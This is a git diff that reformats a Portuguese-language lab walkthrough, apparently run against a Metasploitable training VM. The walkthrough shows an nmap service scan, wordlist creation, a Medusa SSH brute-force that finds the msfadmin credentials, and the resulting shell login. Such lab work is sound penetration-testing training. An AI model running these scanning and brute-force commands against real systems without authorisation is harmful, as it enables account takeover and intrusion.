@@ -3,7 +3,7 @@
 
 1.	**Varredura de portas e versão do serviço**
 
-'nmap -sV 192.168.200.20'<br/>
+`nmap -sV 192.168.200.20'<br/>`
 
 nmap scan report for 192.168.200.20 (192.168.200.20) <br/>
 
@@ -79,32 +79,31 @@ Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
 
 3.	**Criar listas de usuários e senhas**
 
-echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt
-echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt
+echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt <br/>
+echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt <br/>
 
 
-4.	Teste de usuário e senha no serviço ssh com wordlist
+4.	**Teste de usuário e senha no serviço ssh com wordlist**
 
-medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6
-2025-11-04 07:22:48 ACCOUNT FOUND: [ssh] Host: 192.168.200.20 User: msfadmin Password: msfadmin [SUCCESS]
+'medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6' <br/>
 
-5. Teste de acesso SSH com putty
+2025-11-04 07:22:48 ACCOUNT FOUND: [ssh] Host: 192.168.200.20 User: msfadmin Password: msfadmin [SUCCESS] <br/>
 
-login as: msfadmin
-msfadmin@192.168.200.20's password:
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+5. **Teste de acesso SSH com putty**
 
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
+login as: msfadmin <br/>
+msfadmin@192.168.200.20's password: <br/>
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 <br/>
 
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
+The programs included with the Ubuntu system are free software; <br/>
+the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. <br/>
 
-To access official Ubuntu documentation, please visit:
-http://help.ubuntu.com/
-No mail.
-Last login: Tue Nov  4 04:38:44 2025
-msfadmin@metasploitable:~$
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
+
+To access official Ubuntu documentation, please visit: <br/>
+http://help.ubuntu.com/ <br/>
+No mail. <br/>
+Last login: Tue Nov  4 04:38:44 2025 <br/>
+msfadmin@metasploitable:~$ <br/>
 
 
